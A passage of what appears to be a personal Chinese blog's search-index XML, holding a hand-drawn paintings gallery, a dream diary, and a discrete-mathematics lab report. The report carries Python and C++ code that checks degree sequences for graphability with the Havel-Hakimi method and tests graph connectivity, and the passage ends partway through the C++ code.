  <div style="flex: 1"></div>
  <div style="flex: 9; text-align: center;">
    <p>2.头号将军</p>
    <img src="/img/painting/011-2.jpg" alt="HZJ">
  </div>
  <div style="flex: 1"></div>
  <div style="flex: 9; text-align: center;">
    <p>3.Sophie</p>
    <img src="/img/painting/011-3.jpg" alt="LY">
  </div>
</div>

<div style="display: flex;">
  <div style="flex: 9; text-align: center;">
    <p>4.甜心教主</p>
    <img src="/img/painting/011-4.jpg" alt="WXL">
  </div>
  <div style="flex: 1"></div>
  <div style="flex: 9; text-align: center;">
    <p>5.五氟临荣</p>
    <img src="/img/painting/011-5.jpg" alt="LYR">
  </div>
  <div style="flex: 1"></div>
  <div style="flex: 9; text-align: center;">
    <p>6.单挑冠军</p>
    <img src="/img/painting/011-6.jpg" alt="LGH">
  </div>
</div>

<h2 id="2022-07-29"><a href="#2022-07-29" class="headerlink" title="2022-07-29"></a>2022-07-29</h2><h3 id="小樱"><a href="#小樱" class="headerlink" title="小樱"></a>小樱</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/012.jpg" alt="小樱">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2022-08-30"><a href="#2022-08-30" class="headerlink" title="2022-08-30"></a>2022-08-30</h2><h3 id="君の名は。"><a href="#君の名は。" class="headerlink" title="君の名は。"></a>君の名は。</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/013.jpg" alt="君の名は。">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2022-09-05"><a href="#2022-09-05" class="headerlink" title="2022-09-05"></a>2022-09-05</h2><h3 id="喜杨洋"><a href="#喜杨洋" class="headerlink" title="喜杨洋"></a>喜杨洋</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/014.jpg" alt="喜杨洋">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2022-11-04"><a href="#2022-11-04" class="headerlink" title="2022-11-04"></a>2022-11-04</h2><h3 id="古神-魔腾-amp-可达鸭"><a href="#古神-魔腾-amp-可达鸭" class="headerlink" title="古神 魔腾 &amp; 可达鸭"></a>古神 魔腾 &amp; 可达鸭</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/015.jpg" alt="古神 魔腾 & 可达鸭">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2023-03-03"><a href="#2023-03-03" class="headerlink" title="2023-03-03"></a>2023-03-03</h2><h3 id="宵宫"><a href="#宵宫" class="headerlink" title="宵宫"></a>宵宫</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/016.png" alt="宵宫">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2023-06-22"><a href="#2023-06-22" class="headerlink" title="2023-06-22"></a>2023-06-22</h2><h3 id="小黄人"><a href="#小黄人" class="headerlink" title="小黄人"></a>小黄人</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/017.jpg" alt="小黄人">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2023-12-07"><a href="#2023-12-07" class="headerlink" title="2023-12-07"></a>2023-12-07</h2><h3 id="甘雨"><a href="#甘雨" class="headerlink" title="甘雨"></a>甘雨</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/018.jpg" alt="甘雨">
  </div>
  <div style="flex: 1"></div>
</div>
]]></content>
      <categories>
        <category>生活记录</category>
      </categories>
      <tags>
        <tag>画画</tag>
        <tag>马克笔</tag>
        <tag>彩铅</tag>
        <tag>手绘</tag>
      </tags>
  </entry>
  <entry>
    <title>梦</title>
    <url>/posts/dream.html</url>
    <content><![CDATA[<h2 id="2023-01-17"><a href="#2023-01-17" class="headerlink" title="2023-01-17"></a>2023-01-17</h2><p>那是一个豪华的大酒店，我们从环形楼梯跳下去就来到了她的房间（她似乎是我npy？甚至未婚妻？）一进她房间，就看见了一对老夫妻在床上坐着，我以为是岳父岳母，刚准备打招呼，结果她说，那是她收留的，无家可归的老人……我刚想找她的时候，却又发现她不见了，跑出门去，发现她在走廊左跑右跑，似乎又是在帮助谁……</p>
<p>（总之就是对她印象特别好，感觉人好好，但又记不清脸，甚至没有脸，总之也不是现实中的人，梦中情人？有点意难平……）</p>
<h2 id="2023-02-06"><a href="#2023-02-06" class="headerlink" title="2023-02-06"></a>2023-02-06</h2><p>中式祠堂类建筑，有好几层，那块地方地势复杂，好像楼梯也多。我好像打算去哪……一块木板，站在上面可以当滑板，能一直滑，滑好远，就这样，我好像和谢LJ一起滑木板一直去到一个很远的地方，似乎又是乡下了。然后又不知道怎么的得到了两块更精致的木板（和一个类似于桨？的东西），但我不舍得滑，就和他一起抱着回去……</p>
<h2 id="2023-02-09"><a href="#2023-02-09" class="headerlink" title="2023-02-09"></a>2023-02-09</h2><p>先是在一个操场（非现实）上，欧阳Y（后面是DY）想跑步，本来我也想的，可突然开始下雨了，雨越下越大，我戴起我卫衣的帽子，打算离去，可他坚持要跑，于是我开始从楼梯上走（操场在低处，高处才是路），但渐渐地睁不开眼，于是改成了闭上眼睛“爬”楼梯，到了上面后，我淋着雨打算骑自行车走。</p>
<p>莫名其妙变成了推着车走（好像雨又停了？），是在一个弯的斜坡上，一起走的好像是王YX和沈MY，聊着聊着聊到了二中，吧啦吧啦。</p>
<p>（中途路上好像买了零食？）</p>
<p>回到家后（是老家），我发现DY已经回来了，在MM房间床上躺着，好像快睡着了，我把袋子放在桌子上，并惊讶于他比我先到家：“我走的时候你明明还在那跑步啊……”袋子里有但不限于两包薯片，甚至还多了一片薯片在包装外面，我对在场的其他人（忘了有谁，好像有个谢HM）吐槽起来：“买二送一。”大家笑了。</p>
<p>……</p>
<p>在二中，我坐在教学楼楼下和郭PP坐在大理石长凳上聊天，后面好像上课了，我和他匆匆跑到楼上，我问他：”是已经上课多久了吗？“他说：“二十多分钟。”“已经上了二十多分钟了？”我一脸震惊。他说：“不是，是整点过了二十多分钟，现在才刚打铃。”</p>
<p>我匆忙赶到教室，利索地坐上了座位（同桌：左边不知道是谁，右边是徐GY）（我动作也并不是像高中那样有所拘束了……）桌面上是笔记本电脑，老师在讲……SEER？什么HYXH，以及老师对DUYE套居然带CSZY的惊讶，还有一个什么技能反复重现……我似乎想好好表现自己？（我似乎在打？）</p>
<p>……</p>
]]></content>
      <categories>
        <category>生活记录</category>
      </categories>
      <tags>
        <tag>心理</tag>
        <tag>梦</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>离散数学II实验一（Python/C++）</title>
    <url>/posts/discrete_1.html</url>
    <content><![CDATA[<h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a><center>实验一</center></h1><h2 id="（一）实验题目"><a href="#（一）实验题目" class="headerlink" title="（一）实验题目"></a>（一）实验题目</h2><p>可图化、可简单图化、连通性的判别及图的矩阵表达</p>
<h2 id="（二）实验目的"><a href="#（二）实验目的" class="headerlink" title="（二）实验目的"></a>（二）实验目的</h2><p>1、 掌握可图化的定义及判断方法；</p>
<p>2、 掌握可简单图化的定义及判断方法；</p>
<p>3、 掌握连通图的判断方法；</p>
<p>4、 掌握图的矩阵表达。</p>
<h2 id="（三）实验要求"><a href="#（三）实验要求" class="headerlink" title="（三）实验要求"></a>（三）实验要求</h2><p>1、 给定非负整数序列（例如：(4,2,2,2,2)）。</p>
<p>2、 判断此非负整数序列是否是可图化的。</p>
<p>3、 请利用Havel定理判断此非负整数序列是否是可简单图化的，要求输出判断过程与结果。</p>
<p>4、 如果是可简单图化的，请输出该序列对应一个简单图的相邻矩阵，并判断该图是否连通。</p>
<h2 id="（四）实验内容和实验步骤"><a href="#（四）实验内容和实验步骤" class="headerlink" title="（四）实验内容和实验步骤"></a>（四）实验内容和实验步骤</h2><h3 id="1、需求分析"><a href="#1、需求分析" class="headerlink" title="1、需求分析"></a>1、需求分析</h3><ul>
<li><p>（1） 输入的形式和输入值的范围：</p>
<ul>
<li>输入形式：例如4,2,2,2,2（可给定任意数量的序列）</li>
<li>输入值的范围：非负整数</li>
</ul>
</li>
<li><p>（2） 输出的形式：</p>
<p><img src="/img/discrete/1/1.png" alt="img"></p>
<ul>
<li>如图所示，输出时，按照实验要求的顺序依次展开输出</li>
</ul>
</li>
</ul>
<p><img src="/img/discrete/1/2.png" alt="img"></p>
<ul>
<li>（3） 程序所能实现的功能：<ul>
<li>能通过输入任意个数的非负整数序列判断是否可图化，是否可简单图化，并输出相邻矩阵和判断是否连通</li>
<li>可循环，反复输入，方便测试多组数据</li>
</ul>
</li>
</ul>
<h3 id="2、-概要设计"><a href="#2、-概要设计" class="headerlink" title="2、 概要设计"></a>2、 概要设计</h3><ul>
<li><div style="display: flex; align-items: center;">
  <span>我选择的是</span>
    <img style="height:30px; margin:0 5px 0px" src="/img/discrete/1/python.png">
  <span>Python 进行编程，（后面写的C++同理，就不解析了）</span>
</div>
</li>
<li><p>下面是</p>
</li>
<li><p>数据结构定义、主程序的流程及各模块之间的调用关系：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可图化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Graphitization</span>():</span><br><span class="line">	<span class="comment"># 通过定理d1+d2+…+dn=0(mod 2)判断是否可图化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可简单图化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Graphitization_simple</span>():</span><br><span class="line">	<span class="comment"># 先通过n-1≥d1筛选判断</span></span><br><span class="line">	<span class="comment"># 再通过Havel定理判断是否可简单图化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#相邻矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Adjacency_matrix</span>():</span><br><span class="line">	<span class="comment"># 通过优化后的Havel-Hakimi 算法将序列转换成</span></span><br><span class="line">	<span class="comment"># 相邻矩阵并输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#连通</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Connected</span>():</span><br><span class="line">	<span class="comment"># 通过DFS深度优先搜索判断是否连通</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#主函数</span></span><br><span class="line">While <span class="literal">True</span>:</span><br><span class="line">	<span class="comment"># 判断是否可图化</span></span><br><span class="line">	<span class="keyword">if</span> Graphitization():</span><br><span class="line">		<span class="comment"># “可图化”</span></span><br><span class="line">		<span class="comment"># 判断是否可简单图化</span></span><br><span class="line">		<span class="keyword">if</span> Graphitization_simple():</span><br><span class="line">            <span class="comment"># “可简单图化”</span></span><br><span class="line">            <span class="comment"># 判断图是否连通</span></span><br><span class="line">            <span class="keyword">if</span> Connected():</span><br><span class="line">                <span class="comment"># “可连通”</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># “不可连通”</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># “不可简单图化”</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># “不可图化”</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3、详细设计"><a href="#3、详细设计" class="headerlink" title="3、详细设计"></a>3、详细设计</h3><ul>
<li>源代码：（Python和C++）</li>
</ul>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python:"></a>Python:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可图化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Graphitization</span>(<span class="params">array</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">        <span class="built_in">sum</span> += array[i]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span> % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">sum</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可简单图化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Graphitization_simple</span>(<span class="params">array</span>):</span><br><span class="line">    a = <span class="built_in">sorted</span>(array, reverse=<span class="literal">True</span>)     <span class="comment">#降序排序</span></span><br><span class="line">    <span class="keyword">if</span> a[<span class="number">0</span>] &gt;= <span class="built_in">len</span>(array):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;但不满足n-1&gt;=d1&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    string = <span class="string">&#x27;(&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> i != <span class="built_in">len</span>(a)-<span class="number">1</span>:</span><br><span class="line">            string += <span class="built_in">str</span>(a[i]) + <span class="string">&#x27;,&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            string += <span class="built_in">str</span>(a[i])</span><br><span class="line">    <span class="built_in">print</span>(string+<span class="string">&#x27;)可简单图化？&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        head = a.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(head):</span><br><span class="line">            a[i] -= <span class="number">1</span></span><br><span class="line">        a = <span class="built_in">sorted</span>(a, reverse=<span class="literal">True</span>)  <span class="comment"># 降序排序</span></span><br><span class="line">        string = <span class="string">&#x27;⇔(&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            <span class="keyword">if</span> i != <span class="built_in">len</span>(a) - <span class="number">1</span>:</span><br><span class="line">                string += <span class="built_in">str</span>(a[i]) + <span class="string">&#x27;,&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                string += <span class="built_in">str</span>(a[i])</span><br><span class="line">        <span class="built_in">print</span>(string + <span class="string">&#x27;)可简单图化&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> a.count(<span class="number">0</span>) == <span class="built_in">len</span>(a):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> a.count(<span class="number">1</span>) == <span class="number">1</span> <span class="keyword">and</span> a.count(<span class="number">0</span>) == <span class="built_in">len</span>(a)-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            <span class="keyword">if</span> a[i] &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 二维列表排序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort_two</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a[<span class="number">0</span>])):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(a[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> a[<span class="number">0</span>][i] &lt; a[<span class="number">0</span>][j]:</span><br><span class="line">                a[<span class="number">0</span>][i], a[<span class="number">0</span>][j] = a[<span class="number">0</span>][j], a[<span class="number">0</span>][i]</span><br><span class="line">                a[<span class="number">1</span>][i], a[<span class="number">1</span>][j] = a[<span class="number">1</span>][j], a[<span class="number">1</span>][i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相邻矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Adjacency_matrix</span>(<span class="params">array, m</span>):</span><br><span class="line">    a = [[<span class="number">0</span>] * <span class="built_in">len</span>(array) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    a[<span class="number">0</span>] = <span class="built_in">sorted</span>(array, reverse=<span class="literal">True</span>)     <span class="comment">#降序排序</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">        a[<span class="number">1</span>][i] = i</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">                <span class="keyword">if</span> a[<span class="number">1</span>][k] ==  i <span class="keyword">and</span> a[<span class="number">0</span>][k] &gt; <span class="number">0</span> <span class="keyword">and</span> a[<span class="number">0</span>][j] &gt; <span class="number">0</span> <span class="keyword">and</span> i &lt; a[<span class="number">1</span>][j]:</span><br><span class="line">                    m[i][ a[<span class="number">1</span>][j] ] = <span class="number">1</span></span><br><span class="line">                    m[ a[<span class="number">1</span>][j] ][i] = <span class="number">1</span></span><br><span class="line">                    a[<span class="number">0</span>][j] -= <span class="number">1</span></span><br><span class="line">                    a[<span class="number">0</span>][k] -= <span class="number">1</span></span><br><span class="line">        sort_two(a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;其相邻矩阵为：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">            <span class="built_in">print</span>(m[i][j], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连通</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Connected</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">node</span>):</span><br><span class="line">        visited[node] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> neighbor, has_edge <span class="keyword">in</span> <span class="built_in">enumerate</span>(m[node]):</span><br><span class="line">            <span class="keyword">if</span> has_edge <span class="keyword">and</span> <span class="keyword">not</span> visited[neighbor]:</span><br><span class="line">                dfs(neighbor)</span><br><span class="line">    n = <span class="built_in">len</span>(m)</span><br><span class="line">    visited = [<span class="literal">False</span>] * n</span><br><span class="line">    <span class="comment"># 从第一个节点开始深度优先搜索</span></span><br><span class="line">    dfs(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 如果所有节点都被访问到，则图是连通的</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(visited)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 从用户输入获取非负整数序列</span></span><br><span class="line">    cin = <span class="built_in">input</span>(<span class="string">&quot;请输入非负整数序列（用逗号分隔），输入0结束: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cin == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 将输入的字符串转换为非负整数序列</span></span><br><span class="line">        array = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, cin.split(<span class="string">&#x27;,&#x27;</span>)))</span><br><span class="line">        m = [ [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array))] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)) ]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断是否可图化</span></span><br><span class="line">        <span class="keyword">if</span> Graphitization(array):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;该序列“可图化”&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 判断是否可简单图化</span></span><br><span class="line">            <span class="keyword">if</span> Graphitization_simple(array):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;故：该序列“可简单图化”&quot;</span>)</span><br><span class="line">                Adjacency_matrix(array, m)</span><br><span class="line">                <span class="comment"># 判断图是否连通</span></span><br><span class="line">                <span class="keyword">if</span> Connected(m):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;且该图是“连通”的&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;且该图是“不连通”的&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;故：该序列“不可简单图化”&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;该序列“不可图化”&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入错误！请确保输入为非负整数序列，并使用逗号分隔。&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="C"><a href="#C" class="headerlink" title="C++:"></a>C++:</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, nn, a[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;, b[<span class="number">2</span>][<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, array[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;, m[<span class="number">100</span>][<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一维降序排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;nn; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j=i; j&lt;nn; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[i] &lt; a[j])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> temp = a[i];</span><br><span class="line">				a[i] = a[j];</span><br><span class="line">				a[j] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二维降序排序 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j=i; j&lt;n; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (b[<span class="number">0</span>][i] &lt; b[<span class="number">0</span>][j])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> temp = b[<span class="number">0</span>][i];</span><br><span class="line">				b[<span class="number">0</span>][i] = b[<span class="number">0</span>][j];</span><br><span class="line">				b[<span class="number">0</span>][j] = temp;</span><br><span class="line">				temp = b[<span class="number">1</span>][i];</span><br><span class="line">				b[<span class="number">1</span>][i] = b[<span class="number">1</span>][j];</span><br><span class="line">				b[<span class="number">1</span>][j] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可图化</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Graphitization</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++) sum += array[i];</span><br><span class="line">	<span class="keyword">if</span> ( sum%<span class="number">2</span> == <span class="number">0</span> ) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//点数字的个数 </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;nn; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i] == num) sum++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可简单图化</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Graphitization_simple</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">sort1</span>();</span><br><span class="line">	<span class="keyword">if</span> (a[<span class="number">0</span>] &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;不满足n-1&gt;=d1&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;(&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i != n<span class="number">-1</span>) cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; a[i];</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;)可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> head = a[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;nn<span class="number">-1</span>; i++) a[i] = a[i<span class="number">+1</span>];</span><br><span class="line">		nn--;</span><br><span class="line">		a[nn]=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;head; i++) a[i]--;</span><br><span class="line">		<span class="built_in">sort1</span>();</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;&lt;=&gt;(&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i != n<span class="number">-1</span>) cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">			<span class="keyword">else</span> cout &lt;&lt; a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;)可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">count</span>(<span class="number">0</span>) == nn) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">count</span>(<span class="number">1</span>) == <span class="number">1</span> &amp;&amp; <span class="built_in">count</span>(<span class="number">0</span>) == nn<span class="number">-1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;nn; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[i] &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//相邻矩阵</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Adjacency_matrix</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++) a[i] = array[i];</span><br><span class="line">	<span class="built_in">sort1</span>();</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		b[<span class="number">0</span>][i] = a[i];</span><br><span 